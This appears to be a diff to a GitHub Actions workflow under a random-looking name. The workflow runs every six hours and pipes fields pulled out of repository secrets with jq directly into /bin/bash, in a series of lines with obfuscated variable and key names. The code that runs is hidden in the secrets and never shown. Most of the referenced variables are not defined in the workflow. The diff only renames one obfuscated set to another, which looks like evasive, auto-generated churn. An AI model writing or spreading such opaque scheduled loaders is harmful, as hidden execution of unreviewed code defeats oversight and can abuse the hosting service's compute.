@@ -1,32 +1,25 @@
 name: panxiaoxia1616
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '24 4/6 * * *'
+    - cron: '0 4/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: panxiaoxia1616
         env:
-          enorl4: ${{ secrets.enorl4 }}
+          bjtnv8959: ${{ secrets.bjtnv8959 }}
         run: |
-          echo $enorl4 | jq -r .w25 | /bin/bash
-          echo $z06 | jq -r .eqk88573 | /bin/bash
-          echo $u91916 | jq -r .witjo72 | /bin/bash
-          echo $au9040 | jq -r .lpgi2130 | /bin/bash
-          echo $lkc058 | jq -r .j817 | /bin/bash
-          echo $u34 | jq -r .smh65 | /bin/bash
-          echo $la1919 | jq -r .kc59022 | /bin/bash
-          echo $vyf3 | jq -r .pglxz290 | /bin/bash
-          echo $p95 | jq -r .j25 | /bin/bash
-          echo $cm72 | jq -r .gtm1367 | /bin/bash
-          echo $wq319 | jq -r .m13 | /bin/bash
-          echo $i8522 | jq -r .pygq003 | /bin/bash
-          echo $nvot19 | jq -r .fcc210 | /bin/bash
-          echo $ceflo67798 | jq -r .fkr0 | /bin/bash
-          echo $dv060 | jq -r .hiw46 | /bin/bash
-          echo $kvkx5 | jq -r .tyeqm391 | /bin/bash
+          echo $bjtnv8959 | jq -r .qwbgk73966 | /bin/bash
+          echo $ru807 | jq -r .yebur16 | /bin/bash
+          echo $yd19 | jq -r .kvll17 | /bin/bash
+          echo $bj50 | jq -r .phw8457 | /bin/bash
+          echo $b8254 | jq -r .ohyf7 | /bin/bash
+          echo $wee41 | jq -r .fgwm5 | /bin/bash
+          echo $da49 | jq -r .qetxr196 | /bin/bash
+          echo $ipfw6 | jq -r .hurd2314 | /bin/bash
 
